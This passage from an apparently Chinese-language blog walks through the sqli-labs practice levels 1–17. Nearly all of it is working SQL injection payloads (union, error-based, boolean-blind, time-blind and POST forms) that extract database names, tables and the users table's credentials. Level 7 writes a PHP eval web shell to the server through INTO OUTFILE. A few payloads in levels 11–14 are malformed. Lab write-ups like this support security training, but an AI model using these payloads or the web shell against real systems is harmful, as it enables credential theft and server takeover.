href="http://sqli-labs-master:82/Less-1/?id=-1%27union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+">http://sqli-labs-master:82/Less-1/?id=-1%27union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+</a></p></li><li><p>得到对应数据</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200934849.png" alt="image-20250303143244252"></p><p><a href="http://sqli-labs-master:82/Less-1/?id=-1%27%20union%20select%201,2,group_concat(username%20,id%20,%20password)%20from%20users--+">http://sqli-labs-master:82/Less-1/?id=-1%27%20union%20select%201,2,group_concat(username%20,id%20,%20password)%20from%20users--+</a></p></li></ul><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200939723.png" alt="image-20250303143820028"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200943709.png" alt="image-20250303143841256"></p><p> 第二关<strong>无</strong>数字反馈 为数字型  </p><p>注入需要<strong>？id&#x3D;1</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1 order by 3</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,3</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,database(),version()</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span></span></code></pre></div></div></figure><p>一步一步来</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200951228.png" alt="image-20250303144100313"></p><p>分段</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200954804.png" alt="image-20250303144127923"></p><p>爆出数据所在位置</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200958809.png" alt="image-20250303144243223"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201002264.png" alt="image-20250303144258358"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201006378.png" alt="image-20250303144321219"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201010066.png" alt="image-20250303144339430"></p></li></ul><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201014052.png" alt="image-20250303144432279"></p><p>测试出现括号，且为字符型</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;)--+（闭合括号）</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;) order by 3--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) union select 1,2,3--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) union select 1,database(),version()--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) union select 1,2,group_concat(username ,id , password) from users--+</span></span></code></pre></div></div></figure><p>一步一步来</p></li></ul><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201017611.png" alt="image-20250303151047094"></p><p>单引号无报错</p><p>使用双引号测试</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201020801.png" alt="image-20250303151140123"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&quot;) order by 3--+（使用双引号测试）（闭合括号）</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,3--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,database(),version()--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span></span></code></pre></div></div></figure></li></ul><h2 id="5（报错注入）"><a href="#5（报错注入）" class="headerlink" title="5（报错注入）"></a>5（报错注入）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201025778.png" alt="image-20250303151433521"></p><p>字符型</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201027588.png" alt="image-20250303151505518"></p><p>页面无回显（不能使用联合注入）</p></li><li><p>报库（报错注入）<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201030674.png" alt="image-20250303152134366"></p><p><a href="http://sqli-labs-master:82/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)%20--+">http://sqli-labs-master:82/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)%20--+</a></p><p>0x7e是波浪线</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201032668.png" alt="image-20250303152300995"></p><p>报表（全部）（在user概率较大）</p><p><a href="http://sqli-labs-master:82/Less-5/?id=1">http://sqli-labs-master:82/Less-5/?id=1</a>‘ and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1) –+</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201036767.png" alt="image-20250303152637118"></p><p>爆列</p><p><a href="http://sqli-labs-master:82/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(column_name)),0x7e)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),1)--+">http://sqli-labs-master:82/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(column_name)),0x7e)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),1)--+</a></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201039841.png" alt="image-20250303152911332"></p><p><a href="http://sqli-labs-master:82/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(username,id,password)),0x7e)%20from%20users%20),0x7e),1)%20--+">http://sqli-labs-master:82/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(username,id,password)),0x7e)%20from%20users%20),0x7e),1)%20--+</a></p><p>得到数据</p></li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201047696.png" alt="image-20250303153000044"></p><p>使用双引号</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&quot;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1) --+</span></span></code></pre></div></div></figure></li></ul><h2 id="7（文件写入-布尔盲注）"><a href="#7（文件写入-布尔盲注）" class="headerlink" title="7（文件写入&#x2F;布尔盲注）"></a>7（文件写入&#x2F;布尔盲注）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201052792.png" alt="image-20250303205727884"></p><p>测试（题目要求使用文件上传）</p></li><li><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250303210120634.png" alt="image-20250303210120634"></p><p>写入文件（仿照木马病毒）</p></li><li><p>先判断断点</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201056146.png" alt="image-20250303211010525"></p><p>有3个断点</p></li><li><p>使用木马病毒的语句</p><p><a href="http://sqli-labs-master:82/Less-7/?id=1%27))union">http://sqli-labs-master:82/Less-7/?id=1&#39;))union</a> select 1,’<?php eval($_REQUEST[1])?>‘,3 into outfile “D:\software\phpstudy_pro\WWW\sqli-labs-master\Less-7\shell.php”– qwe</p><p>(在文件夹less-7中出现shell.php文件 内容为<?php eval($_REQUEST[1])?>以及目标服务器的账户密码)</p></li><li><?php eval($_REQUEST[1])?><p>可以读取php代码，配合菜刀可以进入服务器</p></li></ul><h2 id="8（布尔盲注）"><a href="#8（布尔盲注）" class="headerlink" title="8（布尔盲注）"></a>8（布尔盲注）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201100207.png" alt="image-20250304125052559"></p><p>  ’ 闭合（只显示正确，错误页面，<strong>布尔盲注</strong>）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span></code></pre></div></div></figure><p>?id&#x3D;1’and length((select database()))&gt;&#x3D;<strong>5</strong>–+（猜库的长度）</p><p>?id&#x3D;1’ and mid(database(),1,1)&#x3D;<strong>‘s’</strong>–+（猜库的名称）  </p><p>（?id&#x3D;1’ and ascii(substr((select database()),1,1))&#x3D;115–+     <strong>115&#x3D;’s’）</strong></p><p>?id&#x3D;1’ and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;<strong>‘security’</strong>),1,1))&gt;&#x3D;101–+</p><p>（同理猜解出表名，列名）</p><p>?id&#x3D;1’ and ascii(substr((select group_concat(<strong>username,password</strong>) from users),1,1))&#x3D;<strong>68</strong>–+（获取数据）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201104011.png" alt="image-20250304130318563"></p></li></ul><h2 id="9（时间注入）"><a href="#9（时间注入）" class="headerlink" title="9（时间注入）"></a>9（时间注入）</h2><ul><li><p>无论输入什么都没有报错</p><p>使用时间注入</p></li><li><p>判断类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201107729.png" alt="image-20250304130800212"></p><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+</p><p>页面有时间延迟，则为真</p></li><li><p>剩余步骤同布尔盲注</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39; and if(1=1,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断参数构造。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and if(length((select database()))&gt;9,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断数据库名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断数据库字符</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有表名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断表名</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有字段名的长度</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断字段名。</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断字段内容长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一检测内容。</span></span></code></pre></div></div></figure></li></ul><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201112138.png" alt="image-20250304131058553"></p><p>?id&#x3D;1” and if(1&#x3D;1,sleep(5),1)–+</p><p>双引号闭合</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&quot; and if(1=1,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断参数构造。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and if(length((select database()))&gt;9,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断数据库名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断数据库字符</span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有表名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断表名</span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有字段名的长度</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断字段名。</span></span><span class="line"><span style="color: #abb2bf">?id=1&quot; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断字段内容长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=1&quot; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一检测内容。</span></span></code></pre></div></div></figure></li></ul><h2 id="11（post注入）"><a href="#11（post注入）" class="headerlink" title="11（post注入）"></a>11（post注入）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201116206.png" alt="image-20250304131416520"></p><p>写入1‘出现报错</p></li><li><p>抓包（相当于get，直接联合注入）</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250304133349636.png" alt="image-20250304133349636"></p><p>也可在username对话框<strong>直接写</strong>联合注入代码</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&#39;or 1=1#</span></span><span class="line"><span style="color: #abb2bf">1&#39; order by 3#</span></span><span class="line"><span style="color: #abb2bf">-1&#39;  union select 1,2#</span></span><span class="line"><span style="color: #abb2bf">-1&#39; union select ,version,database(,version#</span></span><span class="line"><span style="color: #abb2bf">-1&#39;  union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security#</span></span><span class="line"><span style="color: #abb2bf">-1&#39;  union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users#</span></span><span class="line"><span style="color: #abb2bf">-1&#39;  union select 1,group_concat(username ,id , password) from user#</span></span></code></pre></div></div></figure></li></ul><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>写入1”出现报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201121578.png" alt="image-20250304134337329"></p><p>使用  “）进行闭合</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&quot; )or 1=1#</span></span><span class="line"><span style="color: #abb2bf">1&quot; ) order by 3#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; ) union select 1,2#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; ) union select ,version,database(,version#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; ) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; ) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; ) union select 1,group_concat(username ,id , password) from user#</span></span></code></pre></div></div></figure><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>写入1‘出现报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201126096.png" alt="image-20250304134416401"></p><p>使用  ‘）进行闭合</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&#39; )or 1=1#</span></span><span class="line"><span style="color: #abb2bf">1&#39; ) order by 3#</span></span><span class="line"><span style="color: #abb2bf">-1&#39; ) union select 1,2#</span></span><span class="line"><span style="color: #abb2bf">-1&#39; ) union select ,version,database(,version#</span></span><span class="line"><span style="color: #abb2bf">-1&#39; ) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security#</span></span><span class="line"><span style="color: #abb2bf">-1&#39; ) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users#</span></span><span class="line"><span style="color: #abb2bf">-1&#39; ) union select 1,group_concat(username ,id , password) from user#</span></span></code></pre></div></div></figure><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>写入1”出现报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201129817.png" alt="image-20250304134458284"></p><p>只使用双引号</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&quot;or 1=1#</span></span><span class="line"><span style="color: #abb2bf">1&quot; order by 3#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; union select 1,2#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; union select ,version,database(,version#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users#</span></span><span class="line"><span style="color: #abb2bf">-1&quot; union select 1,group_concat(username ,id , password) from user#</span></span></code></pre></div></div></figure><h2 id="15-post布尔注入"><a href="#15-post布尔注入" class="headerlink" title="15(post布尔注入)"></a>15(post布尔注入)</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201138247.png" alt="image-20250304202410979"></p><p>1’ or 1&#x3D;1#</p><p>无反馈，使用布尔盲注</p><p>uname&#x3D;     相关代码   &amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&#39; or 1=1#(判断闭合符号)</span></span><span class="line"><span style="color: #abb2bf">1&#39; or length(database())&gt;7#（猜数据库长度）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or ascii(substr(database(),1,1))&gt;114#（猜数据库名字）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#（猜表名长度）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#（猜列名长度）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or length((select password from users limit 0,1))&gt;3#（猜数据长度）</span></span><span class="line"><span style="color: #abb2bf">1&#39; or ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）</span></span></code></pre></div></div></figure></li></ul><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201140608.png" alt="image-20250304212902595"></p><p><strong>双引号+括号</strong>进行闭合</p></li><li><p>uname&#x3D;     相关代码        &amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&quot;) or 1=1#(判断闭合符号)</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or length(database())&gt;7#（猜数据库长度）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or ascii(substr(database(),1,1))&gt;114#（猜数据库名字）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#（猜表名长度）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#（猜列名长度）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or length((select password from users limit 0,1))&gt;3#（猜数据长度）</span></span><span class="line"><span style="color: #abb2bf">1&quot;) or ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）</span></span></code></pre></div></div></figure></li></ul><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><ul><li><p>题目提示修改密码<br>抓包之后还是post型</p><p>所以使用passd进行测试</p></li><li><p>根据源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201143027.png" alt="image-20250304220832488"></p><p>表明：uname只能是<strong>库名</strong></p><p>​使用passd注入</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201144214.png" alt="image-20250304220949627"></p><p>uname&#x3D;admin</p><p>passd&#x3D;1’  出现报错</p><p>使用报错注入</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201145243.png" alt="image-20250304221231893"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">uname=admin</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1&#39; or 1=1#</span></span><span class="line"><span style="color: #abb2bf">1&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</span></span><span class="line"><span style="color: #abb2bf">1&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) #</span></span><span class="line"><span style="color: #abb2bf">1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)#</span></span><span class="line"><span style="color: #abb2bf">1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1)#</span></span></code></pre></div></div></figure></li></ul><h2 id="18"><a href="#18" 